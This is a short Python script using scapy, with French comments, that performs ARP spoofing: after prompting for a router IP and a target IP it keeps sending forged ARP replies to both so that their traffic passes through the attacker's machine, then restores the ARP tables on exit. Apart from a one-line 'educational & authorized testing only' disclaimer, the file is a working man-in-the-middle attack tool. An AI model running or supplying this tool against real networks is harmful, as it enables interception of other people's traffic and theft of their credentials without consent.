#!/usr/bin/python3
# Disclaimer: Educational & authorized testing only, see DISCLAIMER.md

#pour forward les packets, il suffit de modifier la valeur dans le fichier /proc/sys/net/ipv4/ip_forward -> 0:off ; 1:on, voir le programme ifforwarding a executer en sudo su

import scapy.all as scapy

unicode = str

def restore(destination_IP, source_IP):
	target_mac = get_target_mac(destination_IP)
	source_mac = get_target_mac(source_IP)
	packet = scapy.ARP(op=2, pdst=destination_IP, hwdst=target_mac,psrc=source_IP,hwsrc=source_mac)
	scapy.send(packet, verbose=False)

def get_target_mac(ip):
	arp_request = scapy.ARP(pdst=ip) #on cree un paquet arp avec pour ip de destination l'ip en argument
	broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") #l'adresse sur laquelle tous les appareils ecoutent
	finalpacket = broadcast/arp_request #on concatene les deux
	answer = scapy.srp(finalpacket, timeout=2, verbose=False)[0] #on garde que la 1ere partie de la liste qui est la reponse
	mac = answer[0][1].hwsrc
	return(mac)

def spoof_arp(target_IP,spoofed_IP):
	mac = get_target_mac(target_IP) # on récupère la mac de la cible
	packet = scapy.ARP(op=2, hwdst=mac, pdst=target_IP, psrc=spoofed_IP) # crée le paquet arp avec pour destination la cible
	scapy.send(packet, verbose=False)

def main():

	try:
		router_IP = str(input("[*] Enter router IP: "))
		tgt_IP = str(input("[*] Enter target IP: "))
		print("Running...")
		while True:
			try:
				spoof_arp(router_IP,tgt_IP) #on se fait passer pour la target auprès du routeur
				spoof_arp(tgt_IP,router_IP) #on se fait passer pour le routeur auprès de la target
			except IndexError:
				print("Index error je continue")
				pass
			except TypeError:
				print("Type error je continue")
				pass
			except KeyboardInterrupt:
				break

	finally:
		restore(router_IP,tgt_IP)
		restore(tgt_IP,router_IP)
		print("Parametres restaures a l'origine")
		exit(0)

main()
